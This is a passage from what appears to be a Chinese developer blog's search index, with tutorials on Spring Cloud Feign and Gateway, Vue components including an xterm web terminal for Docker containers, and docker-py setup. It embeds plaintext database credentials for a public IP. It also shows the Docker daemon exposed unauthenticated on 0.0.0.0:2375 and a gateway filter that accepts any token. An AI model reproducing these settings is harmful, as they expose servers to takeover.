main(String[] args) &#123; SpringApplication.run(ApiUserLoginApplication.class, args); &#125; &#125; 添加注解后既可启动服务，在注册中心中可以看到注册成功的服务 用户查询模块 该模块的主要的作用是为登录提供用户查询功能，因此涉及到服务调用 首先创建模块user-check pom文件内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;user-check&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;user-check&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; application.yaml server: port: 9001 spring: application: name: user-check datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false username: root password: root mybatis-plus: global-config: db-config: # table-prefix: tbl_ id-type: auto configuration: # 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果 log-impl: org.apache.ibatis.logging.stdout.StdOutImpl eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 在启动类中添加注释@EnableDiscoveryClient service和dao层代码与之前写内容基本一致 在api-user-login模块中调用user-check 创建UserCheckClient @FeignClient(value = &quot;user-check&quot;) public interface UserCheckClient &#123; @GetMapping(&quot;user/check&quot;) public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); &#125; 其中@FeignClient(value = &quot;user-check&quot;)中的value要与注册到eureka中服务名相同，@GetMapping(&quot;user/check&quot;)要与user-check的controller中的访问路径相同。 方法名也要与controller中的方法相同。并且在有多个参数的情况下需要在每个参数前加上@RequestParam(&quot;username&quot;)，否则fegin调用时，会将所有的参数当成post方式的请求体，从而报错。 public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); api-user-login在service中进行服务调用即可 package com.qfedu.api.service.impl; import com.qfedu.api.service.UserService; import com.qfedu.api.service.fegin.UserCheckClient; import com.qfedu.fmmall.beans.Users; import com.qfedu.fmmall.vo.ResultVO; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.stereotype.Service; @Service public class UserServiceImpl implements UserService &#123; @Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;) @Autowired private UserCheckClient userCheckClient; @Override public ResultVO checkLogin(String username, String password) &#123; // 调用另外一个服务从数据库中查询到用户信息 Users users = userCheckClient.userCheck(username, password); if(users == null) &#123; return ResultVO.failed(&quot;密码错误！&quot;); &#125;else if (&quot;null&quot;.equals(users.getNickname()))&#123; return ResultVO.failed(&quot;用户名不存在！&quot;); &#125;else &#123; return ResultVO.success(users); &#125; &#125; &#125; 搭建gateway 创建gateway服务模块 pom文件内容 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;gateway&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;gateway&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.projectreactor&lt;/groupId&gt; &lt;artifactId&gt;reactor-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 在application.yml中配置相关信息 server: port: 8000 spring: application: name: gateway cloud: gateway: routes: - id: api-service uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-service uri: http://127.0.0.1:8002 predicates: - Path=/user/regist 实现全局过滤器 当用户访问8000端口时，所有的请求都会被该过滤器拦截 因此全局过滤器可以进行权限验证 package com.qfedu.gateway.filter; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.Ordered; import org.springframework.http.HttpStatus; import org.springframework.stereotype.Component; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import java.util.List; @Component public class MyGlobalFilter implements GlobalFilter, Ordered &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123; System.out.println(&quot;-------------------&quot;); System.out.println(&quot;进入全局过滤器&quot;); List&lt;String&gt; token = exchange.getRequest().getHeaders().get(&quot;token&quot;); if(token != null &amp;&amp; token.size() &gt; 0)&#123; // 对token进行验证，如果验证通过则放行本次拦截 return chain.filter(exchange); &#125;else &#123; // 验证不通过，则返回对应的状态码 exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED); // 拦截请求 return exchange.getResponse().setComplete(); &#125; &#125; @Override public int getOrder() &#123; return 0; &#125; &#125; 动态路由配置 使用服务注册与发现实现动态路由 将gateway服务模块加入到eureka中，即添加依赖添加配置文件 eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 使用注册到eureka中的服务名替换ip地址 lb代表使用负载均衡模式，默认策略时轮询 server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: lb://api-user-login #uri: http://127.0.0.1:8001 predicates: - Path=/user/login - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka Gateway限流 基于令牌桶实现的网关限流，使用redis作为桶结合过滤器实现限流 添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis-reactive&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; 配置application.yml server: port: 8000 spring: application: name: gateway main: web-application-type: reactive cloud: gateway: routes: - id: api-login uri: http://127.0.0.1:8001 # uri: lb://api-user-login predicates: - Path=/user/login #限流策略配置 filters: - name: RequestRateLimiter args: redis-rate-limiter.replenishRate: 1 #令牌桶每s的填充速度 redis-rate-limiter.burstCapacity: 2 # 令牌桶容量 redis-rate-limiter.requestedTokens: 1 key-resolver: &quot;#&#123;@keyResolver&#125;&quot; - id: api-regist uri: lb://api-user-regist predicates: - Path=/user/regist redis: host: 127.0.0.1 port: 6379 database: 0 password: # lettuce: # pool: # max-active: 10 # max-wait: 1000 # max-idle: 5 # min-idle: 3 eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka 配置keyResolver package com.qfedu.gateway.config; import org.springframework.cloud.gateway.filter.ratelimit.KeyResolver; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import reactor.core.publisher.Mono; @Configuration public class AppConfig &#123; @Bean public KeyResolver keyResolver() &#123; //http://localhost:9999/order/query?user=1 //使⽤请求中的user参数的值作为令牌桶的key //return exchange -&gt;Mono.just(exchange.getRequest().getQueryParams().getFirst(&quot;user&quot;)); return exchange -&gt; Mono.just(exchange.getRequest().getURI().getPath()); &#125; &#125; 当用户访问的速度超过了令牌的产生速度时就会无法访问，返回429的状态码","tags":[]},{"title":"vue_component","date":"2022-05-26T07:03:25.000Z","path":"2022/05/26/vue-component/","text":"Vue组件做项目中使用到的vue组件，记录一下，以后使用到时直接复制即可 Element UI进入项目目录，安装依赖npm install element-ui -S 安装成功后，查看配置文件package.json，是否有element-ui组件的版本号 如下图： 在main.js文件中 引入 element 组件import ElementUI from &#x27;element-ui&#x27;; import &#x27;element-ui/lib/theme-chalk/index.css&#x27;; Vue.use(ElementUI, &#123; size: &quot;mini&quot; &#125;); 完成以上两个步骤，即可在项目中使用element-ui提供的组件了 Echarts安装依赖npm install echarts -S 如果不加版本号则默认安装最新版 npm install echarts@5.3.2 -S 添加版本号，可以安装指定版本的依赖包，如图所示。 在vue文件中使用Echarts 创建dom组件&lt;div id=&quot;pie&quot; style=&quot;width: 500px; height: 400px&quot;&gt;&lt;/div&gt; 初始化图表数据var pieOption = &#123; title: &#123; text: &#x27;各季度会员数量统计&#x27;, subtext: &#x27;比例图&#x27;, left: &#x27;center&#x27; &#125;, tooltip: &#123; trigger: &#x27;item&#x27; &#125;, legend: &#123; orient: &#x27;vertical&#x27;, left: &#x27;left&#x27; &#125;, series: [ &#123; type: &#x27;pie&#x27;, radius: &#x27;60%&#x27;, label:&#123; //饼图图形上的文本标签 normal:&#123; show:true, position:&#x27;inner&#x27;, //标签的位置 textStyle : &#123; fontWeight : 300 , fontSize : 14, //文字的字体大小 color: &quot;#fff&quot; &#125;, formatter:&#x27;&#123;d&#125;%&#x27; &#125; &#125;, data: [], // 填空 emphasis: &#123; itemStyle: &#123; shadowBlur: 10, shadowOffsetX: 0, shadowColor: &#x27;rgba(0, 0, 0, 0.5)&#x27; &#125; &#125; &#125; ] &#125;; var pieDom = document.getElementById(&#x27;pie&#x27;); var pieChart = echarts.init(pieDom); 其中data: [],是表格显示的数据，这里是需要重点实现的 这里可以在前端页面中写死数据，但是大多需要请求后端接口获取数据，如下 this.request.get(&quot;/echarts/members&quot;).then(res =&gt;&#123; pieOption.series[0].data = [ &#123;name: &quot;第一季度&quot;, value: res.data[0]&#125;, &#123;name: &quot;第二季度&quot;, value: res.data[1]&#125;, &#123;name: &quot;第三季度&quot;, value: res.data[2]&#125;, &#123;name: &quot;第四季度&quot;, value: res.data[3]&#125;, ] pieChart.setOption(pieOption); &#125; 实现效果图 Xterm毕业设计中实现了在网页中进入容器内容，也就是docker exec -it containerId bash功能 与webSHH功能类似 安装依赖npm install xterm -S 安装使用到的插件 npm install xterm-addon-attach -S npm install xterm-addon-fit -S 本文使用的版本如下 在页面中导入使用到的包import &quot;xterm/css/xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; 前端所有代码如下 &lt;template&gt; &lt;div class&#x3D;&quot;app-container&quot;&gt; &lt;el-row &gt; &lt;h1&gt;Web Console&lt;&#x2F;h1&gt; &lt;div id&#x3D;&quot;log&quot; style&#x3D;&quot;margin-top:20px;&quot;&gt; &lt;div class&#x3D;&quot;xterm&quot; id&#x3D;&quot;terminal&quot;&gt;&lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;el-row&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &quot;xterm&#x2F;css&#x2F;xterm.css&quot;; import &#123; Terminal &#125; from &quot;xterm&quot;; import &#123; FitAddon &#125; from &quot;xterm-addon-fit&quot;; import &#123; AttachAddon &#125; from &quot;xterm-addon-attach&quot;; export default &#123; components: &#123;&#125;, props: &#123; socketURI: &#123; type: String, default: &quot;&quot; &#125; &#125;, data() &#123; return &#123; term: null, socket: null, rows: 40, &#x2F;&#x2F; cols: 10, webSocketUrl: &#39;&#39;, &#x2F;&#x2F;&quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;5e0647ee611b&quot;, SetOut: false, isKey: false &#125; &#125;, computed: &#123;&#125;, watch: &#123;&#125;, created() &#123; const id &#x3D; this.$route.query.id console.log(id) this.webSocketUrl &#x3D; &quot;ws:&#x2F;&#x2F;127.0.0.1:8081&#x2F;terminal?workdir&#x3D;&#x2F;&amp;container&#x3D;&quot; + id &#125;, mounted() &#123; this.initSocket(); &#125;, beforeDestroy() &#123; this.socket.close(); &#x2F;&#x2F; this.term.dispose(); &#125;, methods: &#123; submitForm() &#123; this.$refs[&#39;elForm&#39;].validate(valid &#x3D;&gt; &#123; if (!valid) return &#x2F;&#x2F; TODO 提交表单 &#125;) &#125;, resetForm() &#123; this.$refs[&#39;elForm&#39;].resetFields() &#125;, &#x2F;&#x2F;Xterm主题 initTerm(data, callback) &#123; const term &#x3D; new Terminal(&#123; rendererType: &quot;canvas&quot;, &#x2F;&#x2F;渲染类型 rows: this.rows, &#x2F;&#x2F;行数 &#x2F;&#x2F; cols: this.cols,&#x2F;&#x2F; 设置之后会输入多行之后覆盖现象 convertEol: true, &#x2F;&#x2F;启用时，光标将设置为下一行的开头 &#x2F;&#x2F; scrollback: 10,&#x2F;&#x2F;终端中的回滚量 fontSize: 14, &#x2F;&#x2F;字体大小 disableStdin: false, &#x2F;&#x2F;是否应禁用输入。 cursorStyle: &quot;block&quot;, &#x2F;&#x2F;光标样式 cursorBlink: true, &#x2F;&#x2F;光标闪烁 scrollback: 30, tabStopWidth: 8, theme: &#123; foreground: &quot;green&quot;, &#x2F;&#x2F;字体 background: &quot;#000000&quot;, &#x2F;&#x2F;背景色 cursor: &quot;help&quot; &#x2F;&#x2F;设置光标 &#125; &#125;); const attachAddon &#x3D; new AttachAddon(this.socket); const fitAddon &#x3D; new FitAddon(); term.loadAddon(attachAddon); term.loadAddon(fitAddon); term.open(document.getElementById(&quot;terminal&quot;)); fitAddon.fit(); term.focus(); let _this &#x3D; this; &#x2F;&#x2F;限制和后端交互，只有输入回车键才显示结果 term.prompt &#x3D; () &#x3D;&gt; &#123; term.write(&quot;\\r\\n$ &quot;); &#125;; term.prompt(); function runFakeTerminal(_this) &#123; if (term._initialized) &#123; return; &#125; &#x2F;&#x2F; 初始化 term._initialized &#x3D; true; term.writeln();&#x2F;&#x2F;控制台初始化报错处 term.prompt(); &#x2F;&#x2F; &#x2F; ** &#x2F;&#x2F; *添加事件监听器，用于按下键时的事件。事件值包含 &#x2F;&#x2F; *将在data事件以及DOM事件中发送的字符串 &#x2F;&#x2F; *触发了它。 &#x2F;&#x2F; * @返回一个IDisposable停止监听。 &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; &#x2F; ** 更新：xterm 4.x（新增） &#x2F;&#x2F; *为数据事件触发时添加事件侦听器。发生这种情况 &#x2F;&#x2F; *用户输入或粘贴到终端时的示例。事件值 &#x2F;&#x2F; *是&#96;string&#96;结果的结果，在典型的设置中，应该通过 &#x2F;&#x2F; *到支持pty。 &#x2F;&#x2F; * @返回一个IDisposable停止监听。 &#x2F;&#x2F; * &#x2F; &#x2F;&#x2F; 支持输入与粘贴方法 term.onData(function(key) &#123; let order &#x3D; &#123; Data: key, Op: &quot;stdin&quot; &#125;; _this.onSend(order); &#125;); _this.term &#x3D; term; &#125; runFakeTerminal(_this); &#125;, &#x2F;&#x2F;webShell主题 initSocket() &#123; const WebSocketUrl &#x3D; this.webSocketUrl this.socket &#x3D; new WebSocket( WebSocketUrl ); this.socketOnClose(); &#x2F;&#x2F;关闭 this.socketOnOpen(); &#x2F;&#x2F; this.socketOnError(); &#125;, &#x2F;&#x2F;webshell链接成功之后操作 socketOnOpen() &#123; this.socket.onopen &#x3D; () &#x3D;&gt; &#123; &#x2F;&#x2F; 链接成功后 this.initTerm(); &#125;; &#125;, &#x2F;&#x2F;webshell关闭之后操作 socketOnClose() &#123; this.socket.onclose &#x3D; () &#x3D;&gt; &#123; console.log(&quot;close socket&quot;); &#125;; &#125;, &#x2F;&#x2F;webshell错误信息 socketOnError() &#123; this.socket.onerror &#x3D; () &#x3D;&gt; &#123; console.log(&quot;socket 链接失败&quot;); &#125;; &#125;, &#x2F;&#x2F;特殊处理 onSend(data) &#123; data &#x3D; this.base.isObject(data) ? JSON.stringify(data) : data; data &#x3D; this.base.isArray(data) ? data.toString() : data; data &#x3D; data.replace(&#x2F;\\\\\\\\&#x2F;, &quot;\\\\&quot;); this.shellWs.onSend(data); &#125;, &#x2F;&#x2F;删除左右两端的空格 trim(str) &#123; return str.replace(&#x2F;(^\\s*)|(\\s*$)&#x2F;g, &quot;&quot;); &#125; &#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; 以前前端代码基本不需要改动，只需要修改后端的api this.webSocketUrl = &quot;ws://127.0.0.1:8081/terminal?workdir=/&amp;container=&quot; + id 将该参数修改为后端websocket接口即可使用 vue-video-player安装依赖npm install vue-video-player@5.0.2 -S 在单文件中使用首先导入依赖 import &#123; videoPlayer &#125; from &#x27;vue-video-player/src&#x27; import &#x27;video.js/dist/video-js.css&#x27; import &#x27;vue-video-player/src/custom-theme.css&#x27; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, 之前是import &#123; videoPlayer &#125; from &#39;vue-video-player&#39; ，报错信息如下 error in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; ERROR in ./node_modules/vue-video-player/dist/vue-video-player.js Module not found: Error: Can&#x27;t resolve &#x27;videojs&#x27; in &#x27;E:\\Sunzh\\java\\admin_demo\\hello-world\\node_modules\\vue-video-player\\dist&#x27; @ ./node_modules/babel-loader/lib/index.js??clonedRuleSet-40[0].rules[0].use[0]!./node_modules/@vue/vue-loader-v15/lib/index.js??vue-loader-options!./src/views/Detail.vue?vue&amp;type=scr ipt&amp;lang=js&amp; 13:0-47 19:17-28 @ ./src/views/Detail.vue?vue&amp;type=script&amp;lang=js&amp; 1:0-212 1:228-231 1:233-442 1:233-442 @ ./src/views/Detail.vue 2:0-58 3:0-53 3:0-53 9:2-8 @ ./src/router/index.js 82:11-40 @ ./src/main.js 7:0-30 26:10-16 完整的前端代码 &lt;template&gt; &lt;div&gt; &lt;div class&#x3D;&#39;demo&#39;&gt; &lt;video-player class&#x3D;&quot;video-player-box&quot; ref&#x3D;&quot;videoPlayer&quot; :playsinline&#x3D;&quot;true&quot; :options&#x3D;&quot;playerOptions&quot;&gt; &lt;&#x2F;video-player&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;template&gt; &lt;script&gt; import &#123; videoPlayer &#125; from &#39;vue-video-player&#x2F;src&#39; import &#39;video.js&#x2F;dist&#x2F;video-js.css&#39; import &#39;vue-video-player&#x2F;src&#x2F;custom-theme.css&#39; export default &#123; name: &quot;VideoDetail&quot;, components: &#123; videoPlayer &#125;, data() &#123; return &#123; &#x2F;&#x2F; id: this.$route.query.id, &#x2F;&#x2F; video: &#123;&#125;, playerOptions: &#123; playbackRates: [0.5, 1.0, 1.5, 2.0], &#x2F;&#x2F; 可选的播放速度 autoplay: true, &#x2F;&#x2F; 如果为true,浏览器准备好时开始回放。 muted: false, &#x2F;&#x2F; 默认情况下将会消除任何音频。 loop: false, &#x2F;&#x2F; 是否视频一结束就重新开始。 preload: &#39;auto&#39;, &#x2F;&#x2F; 建议浏览器在&lt;video&gt;加载元素后是否应该开始下载视频数据。auto浏览器选择最佳行为,立即开始加载视频（如果浏览器支持） language: &#39;zh-CN&#39;, aspectRatio: &#39;16:9&#39;, &#x2F;&#x2F; 将播放器置于流畅模式，并在计算播放器的动态大小时使用该值。值应该代表一个比例 - 用冒号分隔的两个数字（例如&quot;16:9&quot;或&quot;4:3&quot;） fluid: true, &#x2F;&#x2F; 当true时，Video.js player将拥有流体大小。换句话说，它将按比例缩放以适应其容器。 sources: [&#123; type: &quot;video&#x2F;mp4&quot;, &#x2F;&#x2F; 类型 src: &#39;&#39; &#x2F;&#x2F; url地址 &#125;], poster: &#39;&#39;, &#x2F;&#x2F; 封面地址 notSupportedMessage: &#39;此视频暂无法播放，请稍后再试&#39;, &#x2F;&#x2F; 允许覆盖Video.js无法播放媒体源时显示的默认信息。 controlBar: &#123; timeDivider: true, &#x2F;&#x2F; 当前时间和持续时间的分隔符 durationDisplay: true, &#x2F;&#x2F; 显示持续时间 remainingTimeDisplay: true, &#x2F;&#x2F; 是否显示剩余时间功能 fullscreenToggle: true &#x2F;&#x2F; 是否显示全屏按钮 &#125; &#125; &#125; &#125;, created() &#123; let id &#x3D; this.$route.query.id &#x2F;&#x2F; this.playerOptions.sources[0].src &#x3D; &quot;http:&#x2F;&#x2F;vjs.zencdn.net&#x2F;v&#x2F;oceans.mp4&quot; this.request(&quot;&#x2F;file&#x2F;detail&#x2F;&quot; + id).then(res &#x3D;&gt; &#123; console.log(res.data) this.video &#x3D; res.data this.playerOptions.sources[0].src &#x3D; res.data.url &#125;) &#125;, methods: &#123;&#125; &#125; &lt;&#x2F;script&gt; &lt;style&gt; &lt;&#x2F;style&gt; 需要修改的位置只有this.playerOptions.sources[0].src 将参数换成你的视频地址即可 实现效果如下 可以调整播放速度 Markdown","tags":[{"name":"vue","slug":"vue","permalink":"https://sunzhengyu99.github.io/tags/vue/"}]},{"title":"dockerpy","date":"2022-05-15T05:44:10.000Z","path":"2022/05/15/dockerpy/","text":"Docker-py使用python第三方库docker-py操作docker docker-py的地址：https://github.com/docker/docker-py 配置环境1.安装docker-py​ pip安装即可，安装最新版 pip install docker 2.配置docker本文使用的是Docker Desktop，docker版本是20.10.12 docker开启远程访问对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项 对于linux中配置远程访问就稍微麻烦一点 方法一 在/usr/lib/systemd/system/docker.service，配置远程访问。 主要是在[Service]这个部分，加上下面两个参数 # vim /usr/lib/systemd/system/docker.service [Service] ExecStart= ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock 重启 systemctl daemon-reload systemctl restart docker 方法二 修改daemon.json的配置 vim /etc/docker/daemon.json &#123; &quot;hosts&quot;: [&quot;tcp://0.0.0.0:2375&quot;, &quot;unix:///var/run/docker.sock&quot;] &#125; “unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。 修改配置以后 然后让docker重新读取配置文件,并重启docker服务 systemctl daemon-reload systemctl restart docker 查看docker进程： [root@slaver2 ~]# ps -ef|grep docker root 44221 1 1 18:16 ? 00:00:06 /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock Docker守护进程打开一个HTTP Socket,这样才能实现远程通信 当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准 查看当前版本：http://IP:2375/version 查看所有镜像信息：http://IP:2375/images/json 查看已启动容器信息：http://127.0.0.1:2375/containers/json 查看网卡信息： http://127.0.0.1:2375/networks/ 遇到的问题Docker Desktop与VM冲突需要注意的是，安装Docker Desktop 后VM就无法使用，原因： 1、Device Guard或Credential Guard与Workstation不兼容。 2、Windows系统的Hyper-V不兼容导致 解决方法如https://blog.csdn.net/qq_36761831/article/details/81175736 开启和关闭Hyper-V bcdedit /set hypervisorlaunchtype auto bcdedit /set hypervisorlaunchtype off 当需要使用VM时，执行关闭Hyper-V命令即可 配置国内镜像源settings=&gt;Dokcer engine修改配置内容 &#123; &quot;builder&quot;: &#123; &quot;gc&quot;: &#123; &quot;defaultKeepStorage&quot;: &quot;20GB&quot;, &quot;enabled&quot;: true &#125; &#125;, &quot;experimental&quot;: false, &quot;features&quot;: &#123; &quot;buildkit&quot;: true &#125;, &quot;registry-mirrors&quot;: [ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ] &#125; docker配置软链接由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。参考 请务必先关闭docker 或者docker desktop 通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径： 将.vhdx复制到想要的路径下，本文路径为： 删除源文件夹，本文是data文件夹 以管理员运行cmd并且使用以下命令创建链接： mklink /J C:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data D:\\docker\\data 请大家自行替换路径，本文路径分别为源路径：C:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data 以及想要移动的路径：D:\\docker\\data此时可以在源路径看到新建出来的文件夹 使用dockerpy官方给出了详细的说明文档说明文档，下面只给出几个常见的操作 image相关操作进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作 list()查看源码，可知有三个可选参数 def list(self, name=None, all=False, filters=None): &quot;&quot;&quot; List images on the server. Args: name (str): Only show images belonging to the repository ``name`` all (bool): Show intermediate image layers. By default, these are filtered out. filters (dict): Filters to be processed on the image list. Available filters: - ``dangling`` (bool) - ``label`` (str): format either ``key`` or ``key=value`` Returns: (list of :py:class:`Image`): The images. Raises: :py:class:`docker.errors.APIError` If the server returns an error. &quot;&quot;&quot; resp = self.client.api.images(name=name, all=all, filters=filters) return 